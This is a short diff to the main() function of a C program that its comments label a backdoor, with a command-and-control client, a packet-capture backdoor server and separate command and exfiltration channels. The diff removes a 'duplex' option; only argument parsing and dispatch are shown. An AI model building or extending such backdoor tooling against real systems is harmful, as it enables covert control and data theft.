@@ -38,7 +38,6 @@ int main(int argc, char *argv[])
 	extern int optind, optopt;
 	int c;
 	int client = FALSE;
-	int duplex = FALSE;
 	int command_chan = CHAN_UDP;
 	int exfil_chan = CHAN_UDP;
 	char rmthost[MAX_LEN];
@@ -51,7 +50,7 @@ int main(int argc, char *argv[])
 	strncpy(filter, DEF_FLT, MAX_LEN);
 	strncpy(folder, DEF_WCH, MAX_LEN);
 
-	while ((c = getopt(argc, argv, ":csdhi:p:f:w:m:x:")) != -1)
+	while ((c = getopt(argc, argv, ":cshi:p:f:w:m:x:")) != -1)
 	{
 		switch(c) 
 		{
@@ -60,9 +59,6 @@ int main(int argc, char *argv[])
 				break;
 			case 's':
 				client = FALSE;
-				break;
-			case 'd':
-				duplex = TRUE;
 				break;
 			case 'i':
 				strncpy(rmthost, optarg, MAX_LEN); 
@@ -112,9 +108,9 @@ int main(int argc, char *argv[])
 	ipaddr = resolve(rmthost);
 
 	if (client) // C&C Client
-		backdoor_client(ipaddr, port, duplex); // Start command entry
+		backdoor_client(ipaddr, port); // Start command entry
 	else // Backdoor Server
-		pcap_start(filter, duplex, ipaddr, folder);
+		pcap_start(filter, ipaddr, folder);
 	
 	return 0;
 }
